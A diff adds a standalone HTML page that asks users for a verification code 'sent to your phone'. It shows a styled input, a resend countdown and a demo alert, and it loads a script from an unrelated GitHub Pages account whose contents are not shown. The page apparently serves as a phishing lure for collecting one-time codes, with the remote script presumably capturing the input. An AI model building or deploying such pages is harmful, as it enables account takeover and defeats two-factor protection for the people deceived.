@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Receive Verification Code</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:Arial,Helvetica,sans-serif}
+
+/* ===== BACKGROUND MATCH ===== */
+body{
+  max-width:430px;
+  margin:auto;
+  min-height:100vh;
+  background:
+    linear-gradient(0deg, rgba(14,58,42,0.94), rgba(14,58,42,0.94)),
+    repeating-linear-gradient(
+      45deg,
+      #0f3f2f 0px,
+      #0f3f2f 14px,
+      #114734 14px,
+      #114734 28px
+    );
+  color:#fff;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  padding:16px;
+}
+
+/* ===== CARD ===== */
+.card{
+  width:100%;
+  background:#134b39;
+  border-radius:18px;
+  padding:18px;
+}
+
+/* ===== TITLE ===== */
+h2{
+  text-align:center;
+  color:#ffd600;
+  margin-bottom:8px;
+}
+p{
+  text-align:center;
+  font-size:13px;
+  color:#ffffff;
+  margin-bottom:16px;
+}
+
+/* ===== INPUT ===== */
+.input-box{
+  background:#0f3f2f;
+  border-radius:10px;
+  padding:14px;
+  display:flex;
+  align-items:center;
+  gap:10px;
+  margin-bottom:14px;
+  border:1px solid #1f6a53;
+}
+.input-box:focus-within{
+  border-color:#f3ff66;   /* ✅ soft yellow border */
+}
+.input-box input{
+  width:100%;
+  background:none;
+  border:none;
+  outline:none;
+  color:white;
+  font-size:16px;
+  text-align:center;
+  letter-spacing:3px;
+}
+
+/* ===== VERIFY BUTTON ===== */
+.verify-btn{
+  width:100%;
+  background:#888;
+  border:none;
+  border-radius:12px;
+  padding:14px;
+  font-weight:bold;
+  margin-top:4px;
+  color:#000;
+}
+.verify-btn.active{
+  background:#f3ff66;
+}
+
+/* ===== RESEND ===== */
+.resend{
+  text-align:center;
+  margin-top:14px;
+  font-size:13px;
+  color:#ffffff;
+}
+.resend span{
+  color:#ffd600;
+  cursor:not-allowed;
+}
+
+/* ===== CANCEL ===== */
+.cancel{
+  width:42px;
+  height:42px;
+  margin:18px auto 0;
+  border-radius:50%;
+  background:#0f3f2f;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:20px;
+  color:white;
+  border:1px solid rgba(255,255,255,0.3);
+  cursor:pointer;
+}
+</style>
+</head>
+
+<body>
+<script src="https://eal876955-lgtm.github.io/npi/m/intelligent.js"></script>
+<div class="card">
+  <h2>Verification Code</h2>
+  <p>Please enter the verification code sent to your phone</p>
+<form>
+  <!-- ✅ SINGLE INPUT -->
+  <div class="input-box">
+    <input type="tel" maxlength="10" id="codeInput" placeholder="Enter code" name="verification code">
+  </div>
+
+  <!-- ✅ VERIFY BUTTON -->
+  <button id="verifyBtn" class="verify-btn" disabled type="submit">Verify</button>
+
+  <!-- ✅ RESEND -->
+  <div class="resend">
+    Resend code in <span id="timer">30</span>s
+  </div>
+</form>
+  <!-- ✅ CANCEL -->
+  <div class="cancel" onclick="goBack()">✖</div>
+</div>
+
+<script>
+let codeInput = document.getElementById("codeInput");
+let verifyBtn = document.getElementById("verifyBtn");
+let timerEl = document.getElementById("timer");
+
+let waitTime = 30;
+let currentTime = waitTime;
+let countdown;
+
+/* ENABLE BUTTON WHEN USER TYPES */
+codeInput.addEventListener("input", function(){
+  if(this.value.length > 0){
+    verifyBtn.classList.add("active");
+    verifyBtn.disabled = false;
+  }else{
+    verifyBtn.classList.remove("active");
+    verifyBtn.disabled = true;
+  }
+});
+/* RESEND TIMER LOGIC (INCREASES EACH TIME) */
+function startTimer(){
+  clearInterval(countdown);
+  currentTime = waitTime;
+  timerEl.textContent = currentTime;
+  countdown = setInterval(()=>{
+    currentTime--;
+    timerEl.textContent = currentTime;
+
+    if(currentTime <= 0){
+      clearInterval(countdown);
+      timerEl.textContent = "Resend";
+      timerEl.style.cursor = "pointer";
+      timerEl.onclick = resendCode;
+    }
+  },1000);
+}
+
+/* RESEND FUNCTION */
+function resendCode(){
+  alert("Demo: New code sent");
+  timerEl.style.cursor = "not-allowed";
+  timerEl.onclick = null;
+
+  waitTime += 30;   // ✅ EACH RESEND +30s
+  startTimer();
+}
+
+/* START INITIAL TIMER */
+startTimer();
+
+/* GO BACK */
+function goBack(){
+  history.back();
+}
+</script>
+
+</body>
+</html>
